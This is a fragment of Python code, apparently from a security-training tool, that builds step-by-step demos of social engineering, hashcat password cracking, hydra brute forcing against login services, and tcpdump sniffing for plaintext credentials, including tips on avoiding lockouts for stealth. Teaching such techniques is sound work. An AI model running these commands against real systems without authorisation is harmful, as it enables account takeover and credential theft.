        return [
            Step("OSINT Reconnaissance",
                 "Gather public information about the target.",
                 command="theHarvester -d [DOMAIN] -b google,linkedin,twitter",
                 note="Look for email formats, employee names, phone numbers."),
            Step("Pretext Development",
                 "Create a believable scenario for your approach.",
                 note="Common pretexts: IT support, vendor, auditor, new employee."),
            Step("Physical Access",
                 "Use social engineering to gain physical access.",
                 note="Tailgating, impersonation, badge cloning, dumpster diving."),
            Step("Credential Harvesting",
                 "Obtain passwords through manipulation.",
                 note="Shoulder surfing, fake login pages, USB drops with malware."),
            Step("Defense Awareness",
                 "Train against social engineering attacks.",
                 note="Verify identities, challenge strangers, report suspicious behavior."),
        ]

    def _demo_password_crack(self):
        return [
            Step("Identify Hash Type",
                 "Determine what kind of hash you have.",
                 command="hash-identifier",
                 note="Or check the length and format of the hash."),
            Step("Choose Attack Method",
                 "Select the best approach for the hash type.",
                 note="Online (hydra for logins), Offline (hashcat/john for hashes)."),
            Step("Dictionary Attack",
                 "Try common passwords from a wordlist.",
                 command="hashcat -m [MODE] hash.txt /usr/share/wordlists/rockyou.txt",
                 note="rockyou.txt has 14 million passwords."),
            Step("Brute Force",
                 "Try all possible combinations if dictionary fails.",
                 command="hashcat -m [MODE] -a 3 hash.txt ?a?a?a?a?a?a",
                 note="?a = all chars. ?l = lowercase. ?u = uppercase. ?d = digits. ?s = special."),
            Step("Rule-Based Attack",
                 "Apply mutation rules to wordlist entries.",
                 command="hashcat -m [MODE] -r rules/best64.rule hash.txt wordlist.txt",
                 note="Rules append years, numbers, leet-speak transformations to words."),
            Step("Rainbow Tables",
                 "Use precomputed hash tables for fast lookup.",
                 command="rainbowcrack -h hash.txt -t /path/to/rainbow_tables/",
                 note="Rainbow tables trade storage for speed. Not effective against salted hashes."),
        ]

    def _demo_brute_force(self):
        return [
            Step("Identify Target Service",
                 "Determine what service accepts credentials.",
                 command="nmap -sV -p [PORT] [TARGET_IP]",
                 note="Common: SSH (22), HTTP (80), FTP (21), RDP (3389)."),
            Step("Create Credential Files",
                 "Prepare username and password lists.",
                 command="echo -e 'admin\\nroot\\nuser\\nservice' > users.txt\nhead -1000 /usr/share/wordlists/rockyou.txt > passwords.txt",
                 note="Start small, expand if needed."),
            Step("Launch Attack",
                 "Use Hydra for online brute forcing.",
                 command="hydra -L users.txt -P passwords.txt [TARGET_IP] [SERVICE] -t 4 -vV",
                 note="-t controls threads. Too many may lock out accounts or crash services."),
            Step("Rate Limiting Awareness",
                 "Be aware of account lockout and rate limiting.",
                 note="Slow down if accounts get locked. Try one password per minute for stealth."),
            Step("Alternative Tools",
                 "Use specialized tools for specific protocols.",
                 command="ncrack -p [PORT] [TARGET_IP]\nmedusa -h [TARGET_IP] -u [USER] -P passwords.txt -M [MODULE]",
                 note="Ncrack is good for network services. Medusa supports many modules."),
        ]

    def _demo_packet_sniffing(self):
        return [
            Step("Start tcpdump",
                 "Begin capturing packets on your network interface.",
                 command="sudo tcpdump -i eth0 -w capture.pcap",
                 note="Use -i any to capture on all interfaces."),
            Step("Filter Traffic",
                 "Apply filters to focus on interesting traffic.",
                 command="sudo tcpdump -i eth0 host [TARGET_IP] and port 80",
                 note="Filters: host, port, src, dst, tcp, udp, http, dns."),
            Step("Capture Credentials",
                 "Look for unencrypted credentials in traffic.",
                 command="sudo tcpdump -i eth0 -A | grep -i 'password\\|user\\|login'",
                 note="HTTP basic auth, FTP, Telnet send credentials in plaintext."),
            Step("Wireshark Analysis",
                 "Open capture files in Wireshark for detailed analysis.",
                 command="wireshark capture.pcap",
                 note="Wireshark provides protocol dissectors, follow streams, and statistics."),
            Step("Decrypt Traffic",
                 "If you have the key, decrypt TLS traffic.",
                 note="Set SSLKEYLOGFILE environment variable or use pre-master secret logging."),
        ]

    def _demo_generic(self, topic):
        return [
            Step("Gather Information",
                 f"Research the target and gather relevant information.",
                 note=f"Understanding the target is critical for any {topic} operation."),
            Step("Set Up Environment",
                 "Prepare your tools and attack environment.",
                 note="Ensure you have the necessary tools installed and configured."),
            Step("Plan the Approach",
                 "Design your attack strategy based on gathered intel.",
                 note="Choose the right tools and techniques for the specific scenario."),
            Step("Execute the Attack",
                 "Run your chosen attack against the target.",
                 note="Monitor progress and be ready to adapt if something fails."),
            Step("Verify Results",
                 "Confirm the attack was successful and document findings.",
                 note="Always document what you did for reporting and reproducibility."),
            Step("Clean Up",
                 "Remove any artifacts and restore the target to its original state.",
                 note="Good practice leaves no trace of your testing."),
        ]
